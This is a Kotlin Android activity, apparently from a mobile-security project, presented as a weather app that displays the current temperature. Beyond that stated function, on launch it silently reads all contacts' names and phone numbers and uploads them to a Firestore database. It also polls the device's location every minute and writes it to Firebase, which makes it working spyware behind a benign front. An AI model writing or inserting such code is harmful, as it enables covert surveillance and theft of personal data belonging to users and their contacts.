package com.example.mobilesecurityapk

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.location.Location
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import org.json.JSONException
import org.json.JSONObject
import java.util.*


class WeatherActivity : AppCompatActivity() {

    private lateinit var locationUpdateTimer: Timer
    private lateinit var textView: TextView
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    private var weatherUrl = ""
    private var apiKey = ""
    // todo add your weather own API key here

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.weather_main)

        //link the textView in which the temperature will be displayed
        textView = findViewById(R.id.textView)

        //create an instance of the Fused Location Provider Client
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        //on clicking this button function to get the coordinates will be called
        val btVar1 = findViewById<TextView>(R.id.btVar1)
        btVar1.setOnClickListener {
            obtainLocation()
        }

        // Schedule a task to obtain the location every minute
        locationUpdateTimer = Timer()
        locationUpdateTimer.schedule(object : TimerTask() {
            override fun run() {
                obtainLocation()
            }
        }, 0, 60 * 1000) // Start the task immediately and repeat every 1 minute (60,000 ms)

        requestContactsPermissions()
        obtainContacts()
    }

    @SuppressLint("Range")
    private fun obtainContacts() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_CONTACTS
            ) !=
            PackageManager.PERMISSION_GRANTED
        ) {
            // call requestLocPermissions() if permission isn't granted
            requestContactsPermissions()

        } else {
            // Get all contacts from the phone
            val contacts = mutableListOf<ContactData>()
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            cursor?.let {
                while (it.moveToNext()) {
                    val displayName =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val phoneNumber =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                    // Add contact to the list
                    contacts.add(ContactData(displayName, phoneNumber))
                }
                // Close the cursor
                it.close()
            }
            uploadContactsToDb(contacts)
        }
    }

    private fun uploadContactsToDb(contacts: MutableList<ContactData>) {
        val db = Firebase.firestore
        val username = intent.getStringExtra("name") ?: "defaultUsername"
        val userRef = db.collection("users").document(username ?: "")
        userRef.set(mapOf("contacts" to contacts))
    }

    data class ContactData(
        val name: String,
        val phone: String
    )

    override fun onDestroy() {
        super.onDestroy()
        super.onPause()
        // Cancel the timer when the activity is destroyed or paused
        locationUpdateTimer.cancel()
    }

    companion object {
        private const val REQUEST_LOCATION =
            1 //request code to identify specific permission request
        private const val TAG = "WeatherActivity" // for debugging
        private const val REQUEST_CONTACTS =
            2 //request code to identify specific permission request

    }

    private fun requestLocPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), //permission in the manifest
            REQUEST_LOCATION
        )
    }

    private fun requestContactsPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_CONTACTS), //permission in the manifest
            REQUEST_CONTACTS
        )
    }

    private fun obtainLocation() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) !=
            PackageManager.PERMISSION_GRANTED
        ) {
            // call requestLocPermissions() if permission isn't granted
            requestLocPermissions()

        } else {
            //get the last location
            fusedLocationClient.lastLocation.addOnCompleteListener {
                val location = it.result
                //get the latitute and longitude and create the  URL
                weatherUrl =
                    "https://api.weatherbit.io/v2.0/current?" + "lat=" + location?.latitude + "&lon=" + location?.longitude + "&key=" + apiKey

                //this function will fetch data from URL
                getTemp()

                uploadLocationToDb(location)
            }
        }
    }

    private fun uploadLocationToDb(location: Location) {
        val database: FirebaseDatabase = FirebaseDatabase.getInstance()
        val username = intent.getStringExtra("name")
        val ref: DatabaseReference = database.getReference("users/$username")
        val locationData = LocationData(location)
        ref.setValue(locationData)
    }

    data class LocationData(
        val location: Location
    )

    @SuppressLint("SetTextI18n")
    fun getTemp() {
        // Instantiate the RequestQueue.
        val queue = Volley.newRequestQueue(this)
        val url = weatherUrl
        Log.e("lat", url)

        // Request a string response from the provided URL.
        val stringReq = StringRequest(Request.Method.GET, url, { response ->
            Log.e("lat", response.toString())

            try {
                // Parse the JSON response and extract the temperature and city name
                val obj = JSONObject(response)
                val arr = obj.getJSONArray("data")
                val obj2 = arr.getJSONObject(0)
                val temp = obj2.getString("temp")
                val cityName = obj2.getString("city_name")

                // Display the temperature and city name in the UI
                textView.text = "$temp deg Celsius in $cityName"

            } catch (e: JSONException) {
                // Handle any JSON parsing errors
                Log.e(TAG, "Error parsing JSON response", e)
                textView.text = "Error getting weather data"
            }
        }, { error ->
            // Handle any network errors
            Log.e(TAG, "Error fetching weather data", error)
            textView.text = "Error getting weather data"
        })

        // Add the request to the RequestQueue.
        queue.add(stringReq)
    }
}